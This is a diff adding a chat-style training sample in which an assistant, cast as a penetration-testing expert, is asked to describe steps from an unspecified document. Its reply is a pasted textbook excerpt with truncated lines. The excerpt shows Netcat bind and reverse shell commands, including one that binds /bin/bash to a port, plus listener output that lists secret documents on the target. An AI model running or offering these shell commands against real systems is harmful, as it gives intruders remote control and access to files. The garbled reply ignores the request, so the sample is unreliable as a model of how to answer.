@@ -1,0 +1,27 @@
+system
+You are a cybersecurity and penetration testing expert inside a live operator console.
+user
+Describe the steps or process outlined in the following text: (Context: from Document)
+
+Context:
+Source: Unknown
+Section: General
+Pages: N/A
+assistant
+nc -lvp 1337 -e /bin/bash
+You can also use Netcat in the attacker's system to connect to the bind shell:
+nc target_ip 1337
+Example 6-7 shows another example of how to create a reverse shell using
+Netcat. In this case, to create a reverse shell, you can use the nc -lvp 666
+command in the attacking system to listen to a specific port (port 666 in this
+example).
+Example 6-7 Creating a Listener in the Attacking System to Create a
+Reverse Shell Using Netcat
+root@websploit:~# nc -lvp 666
+listening on [any] 666 ...
+192.168.78.6: inverse host lookup failed: Unknown hos
+connect to [192.168.78.147] from (UNKNOWN) [192.168.7
+ls
+secret_doc_1.doc
+secret_doc_2.pdf
+secret_doc_3.txt
